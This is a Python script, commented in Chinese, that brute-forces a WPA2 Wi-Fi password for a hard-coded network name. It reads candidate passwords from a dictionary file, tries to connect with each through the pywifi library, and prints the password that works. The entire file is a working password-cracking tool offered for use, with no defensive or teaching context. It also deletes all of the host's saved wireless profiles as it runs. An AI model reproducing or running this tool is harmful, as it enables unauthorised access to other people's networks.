# coding:utf-8
import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
from asyncio.tasks import sleep


class PoJie():
    def __init__(self, name, filename):
        self.wif_name = name 
        self.f = open(filename, "r")
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接

        time.sleep(1) #休眠1秒

        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            # my_pwd = self.f.readlines()[120:]
            pwd = 1
  
            # for pwd in my_pwd:
            while pwd:
                pwd = self.f.readline()
                myStr = pwd[:-1]
                
                if len(myStr) < 8:
                    continue
                
                try:
                    bool1 = self.test_connect(myStr)
                    if bool1:
                        print("密码正确：%s" % myStr)
                        break
                    else:
                        print("密码错误: %s" % myStr)

                except Exception as e:
                    print("err line 38: %s" % e)
                    continue

    def test_connect(self, findStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid = self.wif_name #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码

        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(2)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True   
        else:
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK

    def __del__(self):
        self.f.close()

        
def main():
    # print("输入wifi名:")
    # wifi_name = input()
    print("输入密码字典文件名称:")
    file_name = input()
    start = PoJie("CASETC", file_name) #cnpassword.txt
    # start = PoJie("v9", "cnpassword.txt") 
    # print(start.test_connect("azqsx123"))
    start.readPassWord()

if __name__ == '__main__':
    main()